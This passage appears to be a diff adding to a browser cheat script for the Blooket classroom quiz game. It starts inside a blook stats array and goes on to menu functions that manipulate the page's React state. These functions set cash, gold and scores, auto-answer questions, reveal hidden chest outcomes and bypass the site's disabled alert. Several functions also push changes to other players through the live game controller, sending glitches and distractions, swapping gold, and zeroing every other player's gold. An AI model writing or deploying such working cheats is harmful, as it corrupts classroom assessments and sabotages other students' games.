Bear",color:"#7ca1d5",class:"❄️",rarity:"Common",cash:[12,75,700,6500,85e3],time:[8,7,6,5,5],price:[630,7e3,91e3,14e5]},{name:"Walrus",color:"#7d4f33",class:"❄️",rarity:"Common",cash:[11,46,420,3700,51e3],time:[5,5,4,4,4],price:[550,6200,68e3,1e6]},{name:"Tiger",color:"#f18221",class:"\uD83C\uDF34",rarity:"Common",cash:[6,20,100,975,7500],time:[3,3,1,1,1],price:[390,6e3,7e4,61e4]},{name:"Jaguar",color:"#fbb040",class:"\uD83C\uDF34",rarity:"Common",cash:[8,28,230,1600,17e3],time:[3,3,2,2,2],price:[390,6e3,7e4,61e4]},{name:"Toucan",color:"#ffca34",class:"\uD83C\uDF34",rarity:"Common",cash:[9,20,175,625,3800],time:[2,2,2,1,1],price:[520,4800,42e3,3e5]},{name:"Cockatoo",color:"#7ca1d5",class:"\uD83C\uDF34",rarity:"Common",cash:[6,35,160,1700,18e3],time:[4,4,2,2,2],price:[500,5e3,63e3,7e5]},{name:"Macaw",color:"#00aeef",class:"\uD83C\uDF34",rarity:"Common",cash:[3,8,85,850,8500],time:[1,1,1,1,1],price:[480,5400,62e3,63e4]},{name:"Parrot",color:"#ed1c24",class:"\uD83C\uDF34",rarity:"Common",cash:[3,9,90,900,9e3],time:[1,1,1,1,1],price:[540,5700,65e3,69e4]},{name:"Panther",color:"#2f2c38",class:"\uD83C\uDF34",rarity:"Common",cash:[12,28,215,2100,21e3],time:[5,3,2,2,2],price:[530,6500,76e3,87e4]},{name:"Anaconda",color:"#8a9143",class:"\uD83C\uDF34",rarity:"Common",cash:[3,15,85,1500,7600],time:[1,2,1,2,1],price:[410,5100,58e3,59e4]},{name:"Orangutan",color:"#bc6234",class:"\uD83C\uDF34",rarity:"Common",cash:[13,52,570,4300,7e4],time:[5,5,5,4,4],price:[600,7e3,8e4,14e5]},{name:"Capuchin",color:"#e0b0a6",class:"\uD83C\uDF34",rarity:"Common",cash:[4,14,160,780,8200],time:[2,2,2,1,1],price:[390,4700,57e3,68e4]},{name:"Elf",color:"#a7d054",class:"⚔️",rarity:"Uncommon",cash:[5e3,15e3,15e4,15e5,1e7],time:[1,1,1,1,1],price:[8e5,9e6,11e7,8e8]},{name:"Witch",color:"#4ab96d",class:"⚔️",rarity:"Uncommon",cash:[18e3,6e4,4e4,4e6,35e6],time:[3,3,2,2,2],price:[11e5,12e6,15e7,14e8]},{name:"Wizard",color:"#5a459c",class:"⚔️",rarity:"Uncommon",cash:[19500,65e3,44e4,46e5,4e6],time:[3,3,2,2,2],price:[13e5,135e5,16e7,16e8]},{name:"Fairy",color:"#df6d9c",class:"⚔️",rarity:"Uncommon",cash:[18500,6e4,62e4,44e5,38e6],time:[3,3,3,2,2],price:[12e5,125e5,15e6,15e8]},{name:"Slime Monster",color:"#2fa04a",class:"⚔️",rarity:"Uncommon",cash:[35e3,14e4,1e6,11e6,11e7],time:[5,5,4,4,4],price:[16e5,15e6,2e8,23e8]},{name:"Jester",color:"#be1e2d",class:"⚔️",rarity:"Rare",cash:[25e3,1e5,68e4,65e5,32e6],time:[3,3,2,2,1],price:[2e6,21e6,23e7,26e8]},{name:"Dragon",color:"#2fa04a",class:"⚔️",rarity:"Rare",cash:[36e3,15e4,15e5,15e6,15e7],time:[4,4,4,4,4],price:[23e5,24e6,27e7,3e9]},{name:"Unicorn",color:"#f6afce",class:"⚔️",rarity:"Epic",cash:[24e3,15e4,14e5,7e6,75e6],time:[2,2,2,1,1],price:[45e5,45e6,55e7,65e8]},{name:"Queen",color:"#9e1f63",class:"⚔️",rarity:"Rare",cash:[24e3,95e3,95e4,97e5,95e6],time:[3,3,3,3,3],price:[19e5,2e7,23e7,25e8]},{name:"King",color:"#ee2640",class:"⚔️",rarity:"Legendary",cash:[75e3,4e5,6e6,9e7,125e7],time:[5,5,5,5,5],price:[6e6,95e6,16e8,25e9]},{name:"Two of Spades",color:"#414042",class:"\uD83C\uDFF0",rarity:"Uncommon",cash:[4500,14e3,14e4,14e5,9e6],time:[1,1,1,1,1],price:[77e4,83e5,98e6,71e7]},{name:"Eat Me",color:"#d58c55",class:"\uD83C\uDFF0",rarity:"Uncommon",cash:[13e3,45e3,45e4,45e5,5e7],time:[2,2,2,2,2],price:[13e5,14e6,16e7,2e9]},{name:"Drink Me",color:"#dd7399",class:"\uD83C\uDFF0",rarity:"Uncommon",cash:[12e3,4e4,4e5,4e6,45e6],time:[2,2,2,2,2],price:[12e5,12e6,14e7,18e8]},{name:"Alice",color:"#4cc9f5",class:"\uD83C\uDFF0",rarity:"Uncommon",cash:[13e3,42e3,21e4,21e5,23e6],time:[2,2,1,1,1],price:[12e5,13e6,15e7,19e8]},{name:"Queen of Hearts",color:"#d62027",class:"\uD83C\uDFF0",rarity:"Uncommon",cash:[23e3,87e3,62e4,75e5,9e7],time:[4,4,3,3,3],price:[13e5,13e6,18e7,24e8]},{name:"Dormouse",color:"#89d6f8",class:"\uD83C\uDFF0",rarity:"Rare",cash:[17e3,68e3,7e5,35e5,35e6],time:[2,2,1,1,1],price:[2e6,22e6,25e7,28e8]},{name:"White Rabbit",color:"#ffcd05",class:"\uD83C\uDFF0",rarity:"Rare",cash:[26e3,105e3,11e6,77e5,72e6],time:[3,3,3,2,2],price:[2e6,23e6,28e7,29e8]},{name:"Cheshire Cat",color:"#dd7399",class:"\uD83C\uDFF0",rarity:"Rare",cash:[32e3,1e5,9e5,9e6,6e7],time:[4,3,3,3,2],price:[18e5,19e6,22e7,24e8]},{name:"Caterpillar",color:"#00c0f3",class:"\uD83C\uDFF0",rarity:"Epic",cash:[1e4,7e4,65e4,75e5,85e6],time:[1,1,1,1,1],price:[42e5,42e6,54e7,69e8]},{name:"Mad Hatter",color:"#914f93",class:"\uD83C\uDFF0",rarity:"Epic",cash:[38e3,25e4,15e5,14e6,8e7],time:[3,3,2,2,1],price:[48e5,48e6,52e7,66e8]},{name:"King of Hearts",color:"#c62127",class:"\uD83C\uDFF0",rarity:"Legendary",cash:[8e4,42e4,68e5,1e8,15e8],time:[5,5,5,5,5],price:[7e6,11e7,18e8,3e10]},{name:"Earth",color:"#416eb5",class:"\uD83D\uDE80",rarity:"Uncommon",cash:[15e3,45e3,6e5,65e5,65e6],time:[3,3,3,3,3],price:[1e6,11e6,15e7,17e8]},{name:"Meteor",color:"#c68c3c",class:"\uD83D\uDE80",rarity:"Uncommon",cash:[23e3,65e3,7e5,45e5,2e7],time:[5,4,3,2,1],price:[95e4,13e6,16e7,16e8]},{name:"Stars",color:"#19184d",class:"\uD83D\uDE80",rarity:"Uncommon",cash:[1e4,4e4,2e5,2e6,18e6],time:[2,2,1,1,1],price:[14e5,14e6,15e7,15e8]},{name:"Alien",color:"#8dc63f",class:"\uD83D\uDE80",rarity:"Uncommon",cash:[3e4,1e5,1e6,11e6,85e6],time:[4,4,4,4,4],price:[15e5,17e6,19e7,17e8]},{name:"Planet",color:"#9dc6ea",class:"\uD83D\uDE80",rarity:"Rare",cash:[25e3,1e5,9e5,9e6,9e7],time:[3,3,3,3,3],price:[2e6,21e6,21e7,24e8]},{name:"UFO",color:"#a15095",class:"\uD83D\uDE80",rarity:"Rare",cash:[17e3,7e4,7e5,7e6,7e7],time:[2,2,2,2,2],price:[21e5,23e6,25e7,28e8]},{name:"Spaceship",color:"#ffcb29",class:"\uD83D\uDE80",rarity:"Epic",cash:[6e4,32e4,21e5,15e6,85e6],time:[5,4,3,2,1],price:[48e5,46e6,54e7,68e8]},{name:"Astronaut",color:"#9bd4ee",class:"\uD83D\uDE80",rarity:"Legendary",cash:[45e3,26e4,25e5,38e6,55e7],time:[3,3,2,2,2],price:[65e5,1e8,17e8,27e9]},{name:"Lil Bot",color:"#3e564a",class:"\uD83E\uDD16",rarity:"Uncommon",cash:[4e3,12e3,18e4,19e5,25e6],time:[1,1,1,1,1],price:[73e4,12e6,13e7,19e8]},{name:"Lovely Bot",color:"#f179af",class:"\uD83E\uDD16",rarity:"Uncommon",cash:[16e3,65e3,65e4,48e5,42e6],time:[3,3,3,2,2],price:[13e5,14e6,17e7,16e8]},{name:"Angry Bot",color:"#f1613a",class:"\uD83E\uDD16",rarity:"Uncommon",cash:[22e3,85e3,8e5,62e5,65e6],time:[4,4,4,3,3],price:[12e5,13e6,15e7,17e8]},{name:"Happy Bot",color:"#51ba6b",class:"\uD83E\uDD16",rarity:"Uncommon",cash:[11e3,45e3,5e5,25e5,3e7],time:[2,2,2,1,1],price:[14e5,15e6,18e7,24e8]},{name:"Watson",color:"#d69b5a",class:"\uD83E\uDD16",rarity:"Rare",cash:[24e3,1e5,1e6,1e7,1e8],time:[3,3,3,3,3],price:[2e6,22e6,24e7,26e8]},{name:"Buddy Bot",color:"#9dc6ea",class:"\uD83E\uDD16",rarity:"Rare",cash:[22e3,95e3,65e4,65e5,65e6],time:[3,3,2,2,2],price:[19e5,21e6,23e7,25e8]},{name:"Brainy Bot",color:"#9ecf7a",class:"\uD83E\uDD16",rarity:"Epic",cash:[5e4,25e4,21e5,21e6,17e7],time:[4,3,3,3,2],price:[5e6,46e6,5e8,67e8]},{name:"Mega Bot",color:"#d71f27",class:"\uD83E\uDD16",rarity:"Legendary",cash:[8e4,43e4,42e5,62e6,1e9],time:[5,5,3,3,3],price:[7e6,12e7,19e8,35e9]}].map(x => ({ name: x.name, value: JSON.stringify(x) }))
+                    }],
+                    run: function (blook) {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        if (stateNode.state.blooks.length >= 10) alert("Choose a blook to replace");
+                        stateNode.chooseBlook(JSON.parse(blook));
+                    }
+                },
+                {
+                    name: "Free Upgrades",
+                    description: "Sets upgrade prices to 0 for all current blooks",
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState(state => ({ ...state, blooks: state.blooks.map(blook => ({ ...blook, price: [0, 0, 0, 0] })) }));
+                    }
+                },
+                {
+                    name: "Max Blooks",
+                    description: "Maxes out all your blooks' levels",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.state.blooks.forEach(blook => blook.level = 4);
+                    }
+                },
+                {
+                    name: "Remove Glitches",
+                    description: "Removes all enemy glitches",
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({
+                            bits: 0,
+                            ads: [],
+                            hazards: [],
+                            color: "",
+                            lol: false,
+                            joke: false,
+                            slow: false,
+                            dance: false,
+                            glitch: "",
+                            glitcherName: "",
+                            glitcherBlook: ""
+                        });
+                        clearTimeout(stateNode.adTimeout);
+                        clearInterval(stateNode.hazardInterval);
+                        clearTimeout(stateNode.nightTimeout);
+                        clearTimeout(stateNode.glitchTimeout);
+                        clearTimeout(stateNode.lolTimeout);
+                        clearTimeout(stateNode.jokeTimeout);
+                        clearTimeout(stateNode.slowTimeout);
+                        clearTimeout(stateNode.danceTimeout);
+                        clearTimeout(stateNode.nameTimeout);
+                    }
+                },
+                {
+                    name: "Send Glitch",
+                    description: "Sends a glitch to everyone else playing",
+                    inputs: [{
+                        name: "Glitch",
+                        type: "options",
+                        options: Object.entries({ lb: "Lunch Break", as: "Ad Spam", e37: "Error 37", nt: "Night Time", lo: "#LOL", j: "Jokester", sm: "Slow Mo", dp: "Dance Party", v: "Vortex", r: "Reverse", f: "Flip", m: "Micro" }).map(([value, name]) => ({ name, value }))
+                    }],
+                    run: function (val) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.safe = true;
+                        stateNode.props.liveGameController.setVal({ path: `c/${stateNode.props.client.name}/tat`, val });
+                    }
+                },
+                {
+                    name: "Set All MegaBot",
+                    description: "Sets all your blooks to maxed out Mega Bots",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({
+                            blooks: new Array(10).fill({
+                                name: "Mega Bot",
+                                color: "#d71f27",
+                                class: "🤖",
+                                rarity: "Legendary",
+                                cash: [8e4, 43e4, 42e5, 62e6, 1e9],
+                                time: [5, 5, 3, 3, 3],
+                                price: [7e6, 12e7, 19e8, 35e9],
+                                active: false,
+                                level: 4,
+                                bonus: 5.5
+                            })
+                        });
+                    }
+                },
+                {
+                    name: "Set Cash",
+                    description: "Sets amount of cash you have",
+                    inputs: [{
+                        name: "Cash",
+                        type: "number"
+                    }],
+                    run: function (cash) {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ cash });
+                    }
+                }
+            ],
+            fishing: [
+                {
+                    name: "Frenzy",
+                    description: "Sets everyone to frenzy mode",
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.props.liveGameController.setVal({
+                            path: `c/${stateNode.props.client.name}`,
+                            val: {
+                                b: stateNode.props.client.blook,
+                                w: stateNode.state.weight,
+                                f: "Frenzy",
+                                s: true
+                            }
+                        });
+                    }
+                },
+                {
+                    name: "Remove Distractions",
+                    description: "Removes distractions",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            this.data = setInterval(() => {
+                                Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ party: "" });
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Send Distraction",
+                    description: "Sends a distraction to everyone",
+                    inputs: [{
+                        name: "Distraction",
+                        type: "options",
+                        options: ["Crab", "Jellyfish", "Frog", "Pufferfish", "Octopus", "Narwhal", "Megalodon", "Blobfish", "Baby Shark"]
+                    }],
+                    run: function (f) {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.safe = true;
+                        stateNode.props.liveGameController.setVal({
+                            path: `c/${stateNode.props.client.name}`,
+                            val: {
+                                b: stateNode.props.client.blook,
+                                w: stateNode.state.weight, f, s: true
+                            }
+                        });
+                    }
+                },
+                {
+                    name: "Set Lure",
+                    description: "Sets fishing lure (range 1 - 5)",
+                    inputs: [{
+                        name: "Lure (1 - 5)",
+                        type: "number",
+                        min: 1,
+                        max: 5
+                    }],
+                    run: function (lure) {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ lure: Math.max(Math.min(lure - 1, 4), 0) });
+                    }
+                },
+                {
+                    name: "Set Weight",
+                    description: "Sets weight",
+                    inputs: [{
+                        name: "Weight",
+                        type: "number"
+                    }],
+                    run: function (weight) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ weight, weight2: weight });
+                        stateNode.props.liveGameController.setVal({
+                            path: `c/${stateNode.props.client.name}`,
+                            val: {
+                                b: stateNode.props.client.blook,
+                                w: weight,
+                                f: ["Crab", "Jellyfish", "Frog", "Pufferfish", "Octopus", "Narwhal", "Megalodon", "Blobfish", "Baby Shark"][Math.floor(Math.random() * 9)]
+                            }
+                        });
+                    }
+                }
+            ],
+            flappy: [
+                {
+                    name: "Toggle Ghost",
+                    description: "Lets you go through the pipes",
+                    type: "toggle",
+                    enabled: false,
+                    run: function () {
+                        this.enabled = !this.enabled;
+                        Object.values(document.querySelector("#phaser-bouncy"))[1].children[0]._owner.stateNode.state.game.scene.physics.world.bodies.entries.forEach(x => x.gameObject.frame.texture.key.startsWith("blook") && (x.checkCollision.none = this.enabled, x.gameObject.setAlpha(this.enabled ? 0.5 : 1)));
+                    }
+                },
+                {
+                    name: "Set Score",
+                    description: "Sets flappy blook score",
+                    inputs: [{
+                        name: "Score",
+                        type: "number"
+                    }],
+                    run: function (score) {
+                        Object.values(document.querySelector("#phaser-bouncy"))[1].children[0]._owner.stateNode.setState({ score });
+                    }
+                }
+            ],
+            gold: [
+                {
+                    name: "Always Triple",
+                    description: "Always get triple gold",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode._choosePrize ||= stateNode.choosePrize;
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            this.data = setInterval(() => {
+                                stateNode.choosePrize = function (i) {
+                                    stateNode.state.choices[i] = { type: "multiply", val: 3, text: "Triple Gold!", blook: "Unicorn" };
+                                    stateNode._choosePrize(i);
+                                }
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                            stateNode.choosePrize = stateNode._choosePrize || stateNode.choosePrize;
+                        }
+                    }
+                },
+                {
+                    name: "Auto Choose",
+                    description: "Automatically picks the option that would give you the most gold",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            this.data = setInterval(async () => {
+                                try {
+                                    let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                                    if (stateNode.state.stage === "prize") {
+                                        const players = Object.entries(await new Promise(r => stateNode.props.liveGameController.getDatabaseVal("c", c => c && r(c))) || []).filter(x => x[0] != stateNode.props.client.name).sort((a, b) => b[1].g - a[1].g)[0]?.[1]?.g || 0;
+                                        let max = 0; index = -1;
+                                        for (let i = 0; i < stateNode.state.choices.length; i++) {
+                                            const { type, val } = stateNode.state.choices[i];
+                                            let value = stateNode.state.gold;
+                                            switch (type) {
+                                                case "gold": value = stateNode.state.gold + val || stateNode.state.gold; break;
+                                                case "multiply":
+                                                case "divide": value = Math.round(stateNode.state.gold * val) || stateNode.state.gold; break;
+                                                case "swap": value = players || stateNode.state.gold;
+                                                case "take": value = stateNode.state.gold + players * val || stateNode.state.gold;
+                                            }
+                                            if ((value || 0) <= max) continue;
+                                            max = value, index = i + 1;
+                                        }
+                                        document.querySelector(`div[class^='styles__choice${index}']`).click();
+                                    }
+                                } catch { }
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Chest ESP",
+                    description: "Shows what each chest will give you",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            this.data = setInterval(() => {
+                                Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.state.choices.forEach(({ text }, index) => {
+                                    let chest = document.querySelector(`div[class^='styles__choice${index + 1}']`);
+                                    if (!chest || chest.querySelector('div')) return;
+                                    let choice = document.createElement('div');
+                                    choice.style.color = "white";
+                                    choice.style.fontFamily = "Eczar";
+                                    choice.style.fontSize = "2em";
+                                    choice.style.display = "flex";
+                                    choice.style.justifyContent = "center";
+                                    choice.style.transform = "translateY(200px)";
+                                    choice.innerText = text;
+                                    chest.append(choice);
+                                });
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Reset Players Gold",
+                    description: "Sets a player's gold to 0",
+                    inputs: [{
+                        name: "Player",
+                        type: "options",
+                        options: () => {
+                            let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            return new Promise(res => stateNode.props.liveGameController._liveApp ? stateNode.props.liveGameController.getDatabaseVal("c", (players) => players && res(Object.keys(players))) : res([]));
+                        }
+                    }],
+                    run: function (target) {
+                        let { stateNode: { props, state } } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        props.liveGameController.setVal({
+                            path: "c/".concat(props.client.name),
+                            val: {
+                                b: props.client.blook,
+                                g: state.gold,
+                                tat: `${target}:swap:0`
+                            }
+                        });
+                    }
+                },
+                {
+                    name: "Set Gold",
+                    description: "Sets amount of gold",
+                    inputs: [{
+                        name: "Gold",
+                        type: "number"
+                    }],
+                    run: function (gold) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ gold, gold2: gold });
+                        stateNode.props.liveGameController.setVal({
+                            path: "c/".concat(stateNode.props.client.name),
+                            val: {
+                                b: stateNode.props.client.blook,
+                                g: gold
+                            }
+                        });
+                    }
+                },
+                {
+                    name: "Swap Gold",
+                    description: "Swaps gold with someone",
+                    inputs: [{
+                        name: "Player",
+                        type: "options",
+                        options: () => {
+                            let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            return new Promise(res => stateNode.props.liveGameController._liveApp ? stateNode.props.liveGameController.getDatabaseVal("c", (players) => players && res(Object.keys(players))) : res([]));
+                        }
+                    }],
+                    run: function (target) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.props.liveGameController.getDatabaseVal("c", (players) => {
+                            if (!players?.[target]) return;
+                            let { g } = players[target];
+                            stateNode.props.liveGameController.setVal({
+                                path: "c/".concat(stateNode.props.client.name),
+                                val: {
+                                    b: stateNode.props.client.blook,
+                                    g,
+                                    tat: `${target}:swap:${stateNode.state.gold}`
+                                }
+                            });
+                            stateNode.setState({ gold: g, gold2: g });
+                        });
+                    }
+                },
+                {
+                    name: "Reset All Players' Gold",
+                    description: "Set's everyone else's gold to 0",
+                    run: function () {
+                        let i = document.createElement('iframe');
+                        document.body.append(i);
+                        window.alert = i.contentWindow.alert.bind(window);
+                        i.remove();
+                        let { stateNode: { props, state } } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        let count = 0;
+                        props.liveGameController.getDatabaseVal("c", async (players) => {
+                            if (players) for (const player of Object.keys(players)) {
+                                props.liveGameController.setVal({
+                                    path: "c/".concat(props.client.name),
+                                    val: {
+                                        b: props.client.blook,
+                                        g: state.gold,
+                                        tat: `${player}:swap:0`
+                                    }
+                                });
+                                count++;
+                                await new Promise(r => setTimeout(r, 4000));
+                            };
+                            alert(`Reset ${count} players' gold!`);
+                        });
+                    }
+                }
+            ],
+            kingdom: [
+                {
+                    name: "Choice ESP",
+                    description: "Shows you what will happen if you say Yes or No",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            let stats = ['materials', 'people', 'happiness', 'gold'];
+                            let elements = Object.fromEntries([...document.querySelectorAll('[class^=styles__statContainer]')].map((container, i) => [stats[i], container]));
+                            this.data = setInterval(() => {
+                                let { guest: data, phase } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.state;
+                                if (phase == "choice") {
+                                    Array.from(document.getElementsByClassName('choiceESP')).forEach(x => x.remove());
+                                    Object.entries(data.yes || {}).forEach(x => {
+                                        if (x[0] == 'msg' || !stats.includes(x[0])) return;
+                                        let element = document.createElement('div');
+                                        element.className = 'choiceESP';
+                                        element.style = 'font-size: 24px; color: rgb(75, 194, 46); font-weight: bolder;';
+                                        element.innerText = String(x[1]);
+                                        elements[x[0]].appendChild(element);
+                                    });
+                                    Object.entries(data.no || {}).forEach(x => {
+                                        if (x[0] == 'msg' || !stats.includes(x[0])) return;
+                                        let element = document.createElement('div');
+                                        element.className = 'choiceESP';
+                                        element.style = 'font-size: 24px; color: darkred; font-weight: bolder;';
+                                        element.innerText = String(x[1]);
+                                        elements[x[0]].appendChild(element);
+                                    });
+                                }
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            Array.from(document.getElementsByClassName('choiceESP')).forEach(x => x.remove());
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Disable Tax Toucan",
+                    description: "Tax evasion",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.taxCounter = Number.MAX_VALUE;
+                    }
+                },
+                {
+                    name: "Max Stats",
+                    description: "Sets all resources to the max",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ materials: 100, people: 100, happiness: 100, gold: 100 });
+                    }
+                },
+                {
+                    name: "Set Guests",
+                    description: "Sets the amount of guests you've seen",
+                    inputs: [{
+                        name: "Guests",
+                        type: "number"
+                    }],
+                    run: function (guestScore) {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.setState({ guestScore });
+                    }
+                },
+                {
+                    name: "Skip Guest",
+                    description: "Skips the current guest",
+                    run: function () {
+                        Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner.stateNode.nextGuest();
+                    }
+                }
+            ],
+            racing: [
+                {
+                    name: "Instant Win",
+                    description: "Instantly Wins the race",
+                    run: function () {
+                        const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode.setState({ progress: stateNode.state.goalAmount }, () => {
+                            const { state: { question } } = stateNode;
+                            try {
+                                [...document.querySelectorAll(`[class*="answerContainer"]`)][question.answers.map((x, i) => question.correctAnswers.includes(x) ? i : null).filter(x => x != null)[0]]?.click?.();
+                            } catch { }
+                        });
+                    }
+                },
+                {
+                    name: "Set Questions",
+                    description: "Sets the number of questions left",
+                    inputs: [{
+                        name: "Questions",
+                        type: "number"
+                    }],
+                    run: function (progress) {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        progress = stateNode.props.client.amount - progress;
+                        stateNode.setState({ progress });
+                        stateNode.props.liveGameController.setVal({
+                            path: "c/".concat(stateNode.props.client.name),
+                            val: {
+                                b: stateNode.props.client.blook,
+                                pr: progress
+                            }
+                        });
+                    }
+                }
+            ],
+            royale: [
+                {
+                    name: "Auto Answer (Toggle)",
+                    description: "Toggles auto answer on",
+                    type: "toggle",
+                    enabled: false,
+                    data: null,
+                    run: function () {
+                        if (!this.enabled) {
+                            this.enabled = true;
+                            this.data = setInterval(() => {
+                                let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                                stateNode?.onAnswer?.(true, stateNode.props.client.question.correctAnswers[0]);
+                            }, 50);
+                        } else {
+                            this.enabled = false;
+                            clearInterval(this.data);
+                            this.data = null;
+                        }
+                    }
+                },
+                {
+                    name: "Auto Answer",
+                    description: "Chooses the correct answer for you",
+                    run: function () {
+                        let { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                        stateNode?.onAnswer?.(true, stateNode.props.client.question.correctAnswers[0]);
+                    }
+                },
